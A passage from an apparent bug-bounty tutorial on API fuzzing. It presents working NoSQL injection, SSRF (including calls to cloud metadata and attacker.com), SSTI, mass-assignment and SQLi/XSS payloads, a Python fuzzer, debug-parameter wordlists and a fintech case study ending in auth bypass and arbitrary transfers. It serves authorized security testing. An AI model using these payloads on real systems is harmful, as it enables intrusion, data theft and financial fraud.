  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$gt":""}}'

# MongoDB operator injection on GET
curl -s "https://api.target.com/api/v1/users?id[$gt]=0"
```

### 11.3 Server-Side Request Forgery (SSRF)

```bash
# SSRF via API parameters
curl -s "https://api.target.com/api/v1/proxy?url=http://169.254.169.254/latest/meta-data/"
curl -s "https://api.target.com/api/v1/fetch?url=http://127.0.0.1:8080/"
curl -s "https://api.target.com/api/v1/avatar?image_url=http://localhost:5432/"

# POST-based SSRF
curl -s -X POST https://api.target.com/api/v1/webhook \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/"}'

# SSRF via redirect following
curl -s -v "https://api.target.com/api/v1/fetch?url=http://attacker.com/redirect" 2>&1

# Blind SSRF via collaborator
curl -s "https://api.target.com/api/v1/proxy?url=http://YOUR.BURP.COLLABORATOR/oob"
```

### 11.4 Server-Side Template Injection (SSTI)

```bash
# Test for template injection in API parameters
curl -s -X POST https://api.target.com/api/v1/email \
  -H "Content-Type: application/json" \
  -d '{"template":"{{7*7}}","name":"test"}'

curl -s -X POST https://api.target.com/api/v1/render \
  -H "Content-Type: application/json" \
  -d '{"markdown":"${7*7}","format":"html"}'

# Common SSTI test payloads
# {{7*7}}
# ${7*7}
# <%= 7*7 %>
# {{7*'7'}}
# #{7*7}
# *{7*7}
```

### 11.5 Mass Assignment

```bash
# Test for mass assignment vulnerabilities
curl -s -X PUT https://api.target.com/api/v1/profile \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","role":"admin","is_admin":true,"is_verified":true,"credits":999999,"subscription":"enterprise","admin_notes":"test"}'

# If one field is accepted, test all possible privilege-related fields
for field in "role" "is_admin" "isAdmin" "admin" "permissions" "access_level" \
             "user_type" "account_type" "plan" "is_verified" "email_verified" \
             "is_premium" "tier" "subscription" "level"; do
  curl -s -X PUT https://api.target.com/api/v1/profile \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"$field\":\"admin\"}"
done
```

---

## 12. Phase 10: Automation & CI/CD Integration

### 12.1 Schemathesis — Property-Based API Fuzzing

Schemathesis reads your OpenAPI spec and automatically generates test cases:

```bash
# Basic run against a live API
schemathesis run https://api.target.com/openapi.json \
  --header "Authorization: Bearer $TOKEN" \
  --checks all \
  --report report.html

# Run with stateful testing
schemathesis run https://api.target.com/openapi.json \
  --stateful links \
  --checks all \
  --workers 10

# Run for a specific time budget
schemathesis run https://api.target.com/openapi.json \
  --hypothesis-max-examples 10000 \
  --checks all \
  --timeout 30

# With custom validation
schemathesis run https://api.target.com/openapi.json \
  --checks all \
  --validation-errors \
  --data-generation-method positive  # Also try: negative, both
```

### 12.2 Custom Python Fuzzing Script

```bash
#!/usr/bin/env python3
"""
API Fuzzer — Automated parameter and payload discovery
"""
import requests
import itertools
import json
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

TARGET = "https://api.target.com"
TOKEN = "eyJ..."
HEADERS = {"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"}

# Payload categories
payloads = {
    "sqli": ["' OR '1'='1", "' UNION SELECT NULL--", "1; DROP TABLE users--"],
    "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
    "ssrf": ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:22"],
    "idor": ["1", "2", "9999", "100000", "-1", "0"],
    "special": ["null", "undefined", "true", "false", "[]", "{}", ""]
}

def test_endpoint(endpoint, method="GET", params=None, data=None):
    url = f"{TARGET}{endpoint}"
    try:
        if method == "GET":
            r = requests.get(url, headers=HEADERS, params=params, timeout=10)
        elif method == "POST":
            r = requests.post(url, headers=HEADERS, json=data, timeout=10)
        
        return {
            "endpoint": endpoint,
            "method": method,
            "status": r.status_code,
            "length": len(r.text),
            "body": r.text[:500]
        }
    except Exception as e:
        return {"endpoint": endpoint, "error": str(e)}

def fuzz_parameter(endpoint, param, values):
    """Fuzz a single parameter with multiple values"""
    results = []
    for value in values:
        result = test_endpoint(f"{endpoint}?{param}={value}")
        print(f"  [{result['status']}] {param}={value}")
        results.append(result)
    return results

def fuzz_json_field(endpoint, field, values):
    """Fuzz a JSON body field"""
    results = []
    for value in values:
        data = {field: value}
        result = test_endpoint(endpoint, method="POST", data=data)
        status = result.get('status', 'ERR')
        length = result.get('length', 0)
        print(f"  [{status}] {field}: {str(value)[:50]} ({length} bytes)")
        results.append(result)
    return results

# Main fuzzing loop
if __name__ == "__main__":
    endpoints = [
        "/api/v1/users",
        "/api/v1/search",
        "/api/v1/login",
        "/api/v1/profile",
        "/api/v1/admin/users",
    ]
    
    params_to_fuzz = ["id", "user_id", "query", "email", "token", "page", "limit"]
    fields_to_fuzz = ["username", "password", "email", "role", "query", "id"]
    
    for endpoint in endpoints:
        print(f"\n=== Fuzzing {endpoint} ===")
        
        # Test HTTP methods
        for method in ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"]:
            result = test_endpoint(endpoint, method=method)
            print(f"  {method} → {result.get('status', 'ERR')}")
        
        # Fuzz GET parameters
        for param in params_to_fuzz:
            print(f"\n  [GET] Fuzzing parameter: {param}")
            for category, values in payloads.items():
                fuzz_parameter(endpoint, param, values[:2])
        
        # Fuzz POST body fields
        for field in fields_to_fuzz:
            print(f"\n  [POST] Fuzzing field: {field}")
            for category, values in payloads.items():
                fuzz_json_field(endpoint, field, values[:2])
```

### 12.3 Continuous API Monitoring

```bash
#!/bin/bash
# Run fuzzing on schedule and diff results
# Crontab: 0 6 * * * /path/to/api_fuzzer.sh

TOKEN=$(python3 refresh_token.py)
DATE=$(date +%Y%m%d)
BASE="https://api.target.com"
RESULTS_DIR="./fuzz_results/$DATE"
mkdir -p $RESULTS_DIR

# Phase 1: Discover new endpoints
kr scan -w routes-large.kite -u $BASE -o $RESULTS_DIR/kr.json

# Phase 2: Fuzz known endpoints
cat known_endpoints.txt | while read endpoint; do
  ffuf -u "$BASE$endpoint?id=FUZZ" \
    -w ids.txt \
    -mc 200,401,403 \
    -o $RESULTS_DIR/ffuf_$(echo $endpoint | tr '/' '_').json
done

# Phase 3: Schemathesis if spec exists
if [ -f "swagger.json" ]; then
  schemathesis run $BASE/openapi.json \
    --header "Authorization: Bearer $TOKEN" \
    --checks all \
    --report $RESULTS_DIR/schemathesis.html
fi

# Phase 4: Diff against yesterday
if [ -d "./fuzz_results/$(date -d yesterday +%Y%m%d)" ]; then
  echo "=== NEW FINDINGS ===" > $RESULTS_DIR/new_findings.txt
  diff ./fuzz_results/$(date -d yesterday +%Y%m%d)/kr.json \
       $RESULTS_DIR/kr.json | grep "^>" >> $RESULTS_DIR/new_findings.txt
  
  # Alert on new findings
  if [ -s $RESULTS_DIR/new_findings.txt ]; then
    cat $RESULTS_DIR/new_findings.txt | notify -provider slack
  fi
fi
```

---

## 13. Wordlist Strategy for API Fuzzing

Wordlists are the single biggest factor in fuzzing success. Generic wordlists find generic bugs. Targeted wordlists find program-ending bugs.

### 13.1 API Endpoint Wordlists

| Source | Description | Size | Best For |
|--------|-------------|------|----------|
| **Assetnote routes-large** | 478K API routes extracted from real apps | 577MB decompressed | Comprehensive API discovery |
| **Assetnote swagger-wordlist** | Paths extracted from Swagger docs | ~140K lines | OpenAPI endpoint discovery |
| **SecLists APIs** | Curated API paths | ~2K lines | Quick scans |

### 13.2 Parameter Wordlists

```bash
# Common API parameters
cat << 'EOF' > api_params.txt
id
user_id
userId
customer_id
customerId
account_id
token
api_key
apikey
secret
access_token
email
username
password
page
per_page
limit
offset
sort
order
filter
search
q
query
type
status
format
callback
EOF

# Hidden/debug parameters
cat << 'EOF' > debug_params.txt
debug
debug_mode
admin
admin_panel
internal
test
bypass
bypass_auth
bypassAccess
is_admin
isAdmin
role
user_type
enable
disable
feature_flag
migrate
rollback
pretty
verbose
trace
_source
_method
cmd
command
exec
action
EOF
```

### 13.3 Custom Wordlist Generation from the Target

```bash
# Extract company-specific terms
# Look at: job postings, press releases, GitHub repos, JS files
echo "enterprise" > target_terms.txt
echo "onboarding" >> target_terms.txt
echo "kpi_dashboard" >> target_terms.txt
echo "analytics" >> target_terms.txt
# ... add product names, feature names, internal codenames

# Generate API routes from product terms
cat target_terms.txt | while read term; do
  echo "/api/v1/$term"
  echo "/api/v1/$term/list"
  echo "/api/v1/$term/create"
  echo "/api/v1/$term/update"
  echo "/api/v1/$term/delete"
  echo "/api/v1/$term/export"
  echo "/api/v1/$term/import"
  echo "/api/v1/$term/config"
  echo "/api/v1/$term/settings"
  echo "/api/v1/$term/webhook"
  echo "/api/v1/$term/callback"
done
```

---

## 14. Full Real-World Fuzzing Session

Let me walk through a real (anonymized) fuzzing session against a fintech API, showing actual commands and the findings they produced.

**Target:** `api.finpay.io` (fictional name, real methodology)

### 14.1 Phase 1: Discovery (2 hours)

```bash
# Find all API endpoints
kr scan -w routes-large.kite -u https://api.finpay.io -o kr_results.json

# Filter to interesting endpoints
cat kr_results.json | jq -r 'select(.statusCode == 200 or .statusCode == 401) | [.method, .url] | @tsv'
# Results show:
# GET  /api/v1/users
# POST /api/v1/login
# GET  /api/v2/accounts
# POST /api/v2/transfer
# GET  /api/v1/admin/users      ← Interesting!
# GET  /api/v1/internal/health   ← Undocumented!
# POST /api/v1/internal/migrate  ← Undocumented!

# Discover undocumented parameters
arjun -u https://api.finpay.io/api/v1/users --get -H "Authorization: Bearer $TOKEN"
# Found: ?include_inactive=true, ?format=debug, ?show_all=true
```

### 14.2 Phase 2: Profiling (30 minutes)

```bash
# Auth mapping
# /api/v1/admin/users returns 403 with user token → properly restricted
# /api/v2/accounts returns 200 without auth → data exposure!
# /api/v1/internal/health returns 200 without auth → info disclosure
# /api/v1/internal/migrate returns 405 without auth → but endpoint exists

# Version comparison
# /api/v1/users → requires auth (401 without, 200 with)
# /api/v2/users → returns 200 WITHOUT auth
# /api/v3/users → same as v1

# Version gap identified: v2 is missing auth middleware
```

### 14.3 Phase 3: Parameter Fuzzing (3 hours)

```bash
# Fuzz user_id parameter on v1 (should be restricted)
ffuf -u "https://api.finpay.io/api/v1/users?id=FUZZ" \
  -w <(seq 1 1000) \
  -H "Authorization: Bearer $TOKEN" \
  -mc 200

# Fuzz user_id on v2 (no auth required!)
ffuf -u "https://api.finpay.io/api/v2/accounts?user_id=FUZZ" \
  -w <(seq 1 1000) \
  -mc 200

# POST parameter discovery on transfer endpoint
arjun -u https://api.finpay.io/api/v2/transfer --post \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json"
# Discovered fields: amount, from_account, to_account, memo, fee_waived, process_immediately
```

### 14.4 Phase 4: Content-Type Fuzzing (1 hour)

```bash
# Transfer endpoint accepts JSON — try XML
curl -s -X POST https://api.finpay.io/api/v2/transfer \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/xml" \
  -d '<transfer><from_account>12345</from_account><to_account>99999</to_account><amount>999999</amount></transfer>'
# → 200 OK! The XML parser is different from the JSON parser
# → Amount validated differently in XML vs JSON
```

### 14.5 Findings Summary

**Critical:**
1. **Auth bypass via API version** — `/api/v2/accounts` exposes all user accounts with no authentication
2. **IDOR via parameter** — `/api/v2/accounts?user_id=1` returns any user's account data without auth
3. **Mass assignment** — `/api/v1/profile` accepts `role: "admin"` field during PUT

**High:**
4. **Content-Type confusion** — XML endpoint skips amount validation, allowing arbitrary transfers
5. **Undocumented admin endpoint** — `/api/v1/internal/migrate` accessible with any valid auth token
6. **Debug parameter exposure** — `?format=debug` returns SQL queries in response body

**Medium:**
7. **Rate limit bypass** — `X-Forwarded-For` rotation bypasses 10 req/min limit
8. **NoSQL injection** — Login endpoint accepts `{"$ne":null}` for password field

---

## 15. Tool Inventory & Reference

### 15.1 Core Fuzzing Tools

| Tool | Category | Best For | Install |
|------|----------|----------|---------|
| **ffuf** | Generic fuzzer | Path, parameter, value fuzzing | `go install github.com/ffuf/ffuf/v2@latest` |
| **Kiterunner** | API content discovery | API route brute-forcing | GitHub releases |
| **Arjun** | Parameter discovery | Finding hidden GET/POST params | `pip install arjun` |
| **Schemathesis** | Property-based fuzzing | Auto-generated test cases from OpenAPI | `pip install schemathesis` |
| **RESTler** | Stateful fuzzing | Stateful API sequence testing | GitHub + venv |
| **InQL** | GraphQL fuzzing | GraphQL schema introspection | Burp BApp Store |

### 15.2 Burp Suite Extensions

| Extension | Purpose |
|-----------|---------|
| **Turbo Intruder** | High-speed fuzzing with custom scripts |
| **ParamMiner** | Automated parameter discovery |
| **AuthMatrix** | Authorization testing matrix |
| **InQL Scanner** | GraphQL introspection and fuzzing |
| **JSON Web Tokens** | JWT manipulation and attack |
| **OpenAPI Parser** | Import and test from Swagger specs |

### 15.3 Online Services

| Service | Purpose | Free Tier |
|---------|---------|-----------|
| **GrayHatWarfare** | Public cloud bucket search | Limited |
| **Shodan** | API service discovery | Limited API |
| **web.archive.org** | Historical endpoint discovery | Unlimited |
| **crt.sh** | Certificate transparency → subdomains | Unlimited |
| **Hunter.io** | Email → API key patterns | 25 queries/month |

### 15.4 Essential Wordlists

```bash
# Download all essential wordlists
# API endpoints
wget https://wordlists-cdn.assetnote.io/data/kiterunner/routes-large.kite.tar.gz
wget https://wordlists-cdn.assetnote.io/data/kiterunner/routes-small.kite.tar.gz
wget https://wordlists-cdn.assetnote.io/data/manual/swagger-wordlist.txt

# Generic fuzzing
git clone https://github.com/danielmiessler/SecLists.git

# API parameters
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/api/api-params.txt

# SQL injection
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/SQLi/Generic-SQLi.txt
```

---

## 16. Common Mistakes & How to Avoid Them

### Mistake 1: Fuzzing Without a Baseline

**❌ Wrong:** Start fuzzing immediately without understanding the API's normal behavior.

**✅ Right:** 
```bash
# First, send a valid request and record the baseline
curl -s -v -H "Authorization: Bearer $TOKEN" \
  "https://api.target.com/api/v1/users?id=1" 2>&1 | tee baseline.txt

# Baseline includes: response body, status code, response time, headers, content-length
# Now fuzz and compare everything against this baseline
```

### Mistake 2: Only Fuzzing Documented Endpoints

**❌ Wrong:** Only fuzz endpoints listed in Swagger docs.

**✅ Right:** Swagger docs are a starting point, not an exhaustive list. Use Kiterunner, Wayback Machine, JS files, and mobile decompilation to find undocumented endpoints that are often less secure.

### Mistake 3: Ignoring API Versions

**❌ Wrong:** Test only `/api/v1/` and assume all versions are identical.

**✅ Right:** Test every API version (`/v1`, `/v2`, `/v3`, `/internal`, `/mobile`, `/partner`). Security controls are rarely backported to older versions.

### Mistake 4: Single-Endpoint Fuzzing

**❌ Wrong:** Fuzz each endpoint in isolation.

**✅ Right:** Stateful bugs require sequences. Test:
1. Create resource → access resource → delete resource
2. Login → logout → replay login token
3. Race conditions on concurrent writes

### Mistake 5: Ignoring Content-Type

**❌ Wrong:** Only test endpoints with the Content-Type they advertise.

**✅ Right:** APIs often have multiple parsers. If an endpoint accepts JSON, try XML, YAML, form-data. If it accepts XML, try JSON. The alternate parser is often less validated.

### Mistake 6: Not Testing Mobile APIs Separately

**❌ Wrong:** Use the same API base URL for all testing.

**✅ Right:** Mobile APIs often use different subdomains (`mobile-api.target.com`), different versions (`/v3/mobile`), and have fewer security controls. Test them separately.

### Mistake 7: Rate-Limiting Yourself Out

**❌ Wrong:** Send 1000 requests/second without rate limiting awareness.

**✅ Right:** 
```bash
# Always check rate limits first with a burst test
# Then calibrate your fuzzing speed
# Use IP rotation when possible
# Use slow, distributed fuzzing over fast, centralized fuzzing
```

### Mistake 8: Not Diffsing Results Across Sessions

**❌ Wrong:** Run fuzzing once and consider it complete.

**✅ Right:** APIs change daily. New endpoints appear, old ones get deprecated, auth models change. Run fuzzing on a schedule and diff results to catch new surface area.

---

## 17. The Complete API Fuzzing Checklist

### Pre-Fuzzing Setup
- [ ] Set up Burp/ZAP as intercepting proxy
- [ ] Walk through application manually → capture all requests
- [ ] Create two+ test accounts (user_a, user_b, admin if available)
- [ ] Install all tools and download wordlists
- [ ] Obtain/refresh API tokens
- [ ] Determine base URL(s) — web API, mobile API, partner API

### Phase 1: Discovery
- [ ] Check for Swagger/OpenAPI docs at common paths
- [ ] Run Kiterunner with routes-large on each base URL
- [ ] Run ffuf with API endpoint wordlists
- [ ] Check Wayback Machine for historical endpoints
- [ ] Extract API endpoints from JavaScript files
- [ ] Decompile mobile app and extract API routes
- [ ] Search GitHub for leaked API docs/configs
- [ ] Document all discovered endpoints by version

### Phase 2: Profiling
- [ ] Map auth requirements for each endpoint (200/401/403)
- [ ] Test all HTTP methods on each endpoint (GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD)
- [ ] Compare auth across API versions (v1 vs v2 vs v3)
- [ ] Compare web API vs mobile API behavior
- [ ] Identify rate limiting thresholds
- [ ] Document baseline responses (size, time, headers)

Continuing from where we left off in the checklist:

### Phase 3: Parameter Fuzzing (continued)
- [ ] Run Arjun on each endpoint for hidden GET/POST parameters
- [ ] Fuzz discovered parameters with payloads (SQLi, XSS, NoSQL, SSTI)
- [ ] Fuzz IDOR-prone parameters with sequential/parallel IDs
- [ ] Test for mass assignment on PUT/PATCH endpoints
- [ ] Test parameter pollution (duplicate params, array wrapping)
- [ ] Fuzz debug/developer parameters (`debug=true`, `admin_panel=1`)

### Phase 4: Content-Type & Serialization
- [ ] Test XML on JSON endpoints and vice versa
- [ ] Test XXE via Content-Type conversion
- [ ] Test deserialization vectors (Java, PHP, Python, .NET)
- [ ] Test alternative formats (YAML, MessagePack, form-data)
- [ ] Test JSONP callback injection

### Phase 5: Authorization & Access Control
- [ ] Test horizontal IDOR (user_a accessing user_b data via user_id parameter)
- [ ] Test vertical privilege escalation (user accessing admin endpoints)
- [ ] Test HTTP method override headers (`X-HTTP-Method-Override`)
- [ ] Test JWT attacks (`none` algorithm, algorithm confusion)
- [ ] Test token reuse across environments (staging token on prod)
- [ ] Test with expired, malformed, and revoked tokens

### Phase 6: Rate Limiting
- [ ] Detect rate limit thresholds (burst test 100 requests)
- [ ] Test IP-based bypass (X-Forwarded-For, X-Real-IP rotation)
- [ ] Test endpoint-based bypass (different login endpoints)
- [ ] Test timing-based bypass (stay under threshold with delays)
- [ ] Test parallel request batching

### Phase 7: Stateful Testing
- [ ] Create → Read → Update → Delete resource sequences
- [ ] Test race conditions on concurrent requests
- [ ] Test resource leak (create without cleanup)
- [ ] Test state inconsistency (read after partial update)
- [ ] Run RESTler or Schemathesis for automated stateful fuzzing

### Phase 8: GraphQL (if applicable)
- [ ] Test introspection query
- [ ] Try introspection bypass techniques (newlines, GET, URL-encoded)
- [ ] Run InQL Scanner to dump schema
- [ ] Test batching for auth bypass
- [ ] Test query depth/complexity limits
- [ ] Test SQLi/NoSQLi in GraphQL fields
- [ ] Test alias abuse for rate limit bypass

### Phase 9: Vulnerability-Specific
- [ ] SQL injection on all string parameters
- [ ] NoSQL injection on JSON body fields
- [ ] SSRF on URL/fetch/webhook parameters
- [ ] SSTI on template/render/markdown parameters
- [ ] Command injection on parameters passed to system calls
- [ ] Path traversal on file/path parameters

### Phase 10: Continuous Monitoring
- [ ] Schedule daily endpoint diff against previous scan
- [ ] Monitor certstream for new subdomains → new API endpoints
- [ ] Set up Schemathesis in CI pipeline
- [ ] Alert on new endpoints, removed auth, changed responses
- [ ] Re-run full pipeline weekly on high-value targets

---

## Final Thoughts

API fuzzing is the highest-ROI activity in modern bug bounty hunting. Web applications have become API wrappers — the real functionality, data, and vulnerabilities live in the API layer. Most hunters are still clicking buttons in the browser while the API sits there, undocumented, un-audited, and full of bugs.

The pipeline described here — **discover → profile → fuzz → exploit → monitor** — is a continuous cycle, not a one-time task. Every time the target deploys a new API version, acquires a new company, or spins up a new microservice, they introduce new surface area that you can find before anyone else.

**Remember:**
- The main API is a battlefield. The `/v3/internal/` endpoint is where you win.
- Mobile APIs are the weakest link. They're built faster, tested less, and have fewer security controls.
- Hidden parameters are gold. A single `?admin=true` or `?debug=1` can unlock the entire application.
- Versions don't get backported patches. `/v1` is forever vulnerable.

Go fuzz. Find what others miss.

---

*This article was written for fellow security professionals conducting authorized security assessments. Always ensure you have explicit, written authorization before testing any system. The techniques described should only be used within scope of authorized bug bounty programs or penetration testing engagements.*